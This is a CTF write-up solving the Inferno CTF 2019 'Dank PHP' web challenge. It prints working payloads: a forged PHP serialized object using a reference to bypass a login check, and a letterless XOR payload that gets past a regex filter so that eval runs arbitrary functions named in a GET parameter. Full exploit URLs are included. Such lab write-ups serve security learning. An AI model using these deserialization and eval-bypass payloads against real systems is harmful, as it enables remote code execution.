# Inferno CTF 2019 – Dank PHP

* **Category:** Web
* **Points:** 375

## Challenge

> I love Dank Memes+PHP
> 
> Link: http://104.197.168.32:17010/
> 
> Author : MrT4ntr4

## Solution

The website will show its own source code.

```php
<?php
include "flag.php";

show_source(__FILE__);

class user {
  var $name;
  var $pass;
  var $secret;
}

if (isset($_GET['id'])) {

  $id = $_GET['id'];

  $usr = unserialize($id);
  if ($usr) {
    $usr->secret = $flag1;
    if ($usr->name === "admin" && $usr->pass === $usr->secret) {
      echo "Congratulation! Here is something for you...  " . $usr->pass;
      if (isset($_GET['caption'])) {
        $cap = $_GET['caption'];
        if (strlen($cap) > 45) {
          die("Naaaah, Take rest now");
        }
        if (preg_match("/[A-Za-z0-9]+/", $cap)) {
          die("Don't mess with the best language!!");
        }
        eval($cap);
        // Try to execute echoFlag()
      } else {
        echo "NVM You are not eligible";
      }
    } else {
      echo "Oh no... You can't fool me";
    }

  } else {
    echo "are you trolling?";
  }

} else {
  echo "Go and watch some Youthoob Tutorials Kidosss!!";
}
```

You have to bypass some checks in order to get the flag. The first part of the flag, i.e. `$flag1`, is printed after the first check, the second part of the flag can be obtained executing `echoFlag()` method when the `eval($cap)` instruction is reached.

First of all you have to replicate a serialized input to pass via `id` HTTP GET parameter. This could be done with the following code.

```php
<?php
class user {
  var $name;
  var $pass;
  var $secret;
}

$usr = new user();
$usr->name = "name";
$usr->pass = "pass";
$usr->secret = "secret";

$id = serialize($usr);
echo $id;
```

The result is the following payload.

```
O:4:"user":3:{s:4:"name";s:5:"admin";s:4:"pass";s:4:"pass";s:6:"secret";s:6:"secret";}
```

The first check to bypass is the following.

```php
    $usr->secret = $flag1;
    if ($usr->name === "admin" && $usr->pass === $usr->secret) {
```

This can be achieved referencing `$usr->secret` field from the `$usr->pass` field, so when the assign operation with `$flag1` will be performed, both fields will be equals.

In PHP serialization, this can be done with the `R` clause, pointing to the index of the referenced object. The crafted payload is the following.

```
O:4:"user":3:{s:4:"name";s:5:"admin";s:6:"secret";s:6:"secret";s:4:"pass";R:3;}
```

The complete URL is the following.

```
http://104.197.168.32:17010/?id=O:4:%22user%22:3:{s:4:%22name%22;s:5:%22admin%22;s:6:%22secret%22;s:6:%22secret%22;s:4:%22pass%22;R:3;}
```

The answer will be the following.

```
Congratulation! Here is something for you...
infernoCTF{pHp_1s_
NVM You are not eligible
```

The second check to bypass is the following.

```php
      if (isset($_GET['caption'])) {
        $cap = $_GET['caption'];
        if (strlen($cap) > 45) {
          die("Naaaah, Take rest now");
        }
        if (preg_match("/[A-Za-z0-9]+/", $cap)) {
          die("Don't mess with the best language!!");
        }
        eval($cap);
        // Try to execute echoFlag()
```

This is quite hard, because there are two strong constraints.

Usually, `preg_match` [can be bypassed using arrays](https://bugs.php.net/bug.php?id=69274), but in this case I was not able to use the content of the array into the `eval` instruction.

Googling around, I learned about a technique to bypass WAF using non-alfanumeric input, performing logic operations on non-alfanumeric chars using non-alfanumeric variables.

Considering the check on the length, and the overhead of this kind of payloads, probably the best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. `_`.

I found two interesting websites:
* [Bypass WAF - Php webshell without numbers and letters](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/);
* [`preg_match` Code Execution](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#preg_match-code-execution).

In the second website, there is the same scenario of the challenge, so I used it to craft my payload.

Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.

```php
$_="`{{{"^"?<>/"; // This is: "_GET" string.
```

Then you can specify the execution of the content of a GET parameter with the following code.

```php
${$_}[_]();       // This is $_GET[_]()
```

So the complete payload that will be executed by the `eval` instruction will be the following.

```php
$_="`{{{"^"?<>/";${$_}[_]();
```

Putting everything together, you can craft the final URL to invoke. The last thing to do is to specify the HTTP GET parameter called `_` where the name of the function to call will be passed.

```
http://104.197.168.32:17010/?id=O:4:%22user%22:3:{s:4:%22name%22;s:5:%22admin%22;s:6:%22secret%22;s:6:%22secret%22;s:4:%22pass%22;R:3;}&caption=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_]();&_=echoFlag
```

The web page will give the following answer.

```
Congratulation! Here is something for you...
infernoCTF{pHp_1s_
a_h34dache}
```

So the flag is the following.

```
infernoCTF{pHp_1s_a_h34dache}
```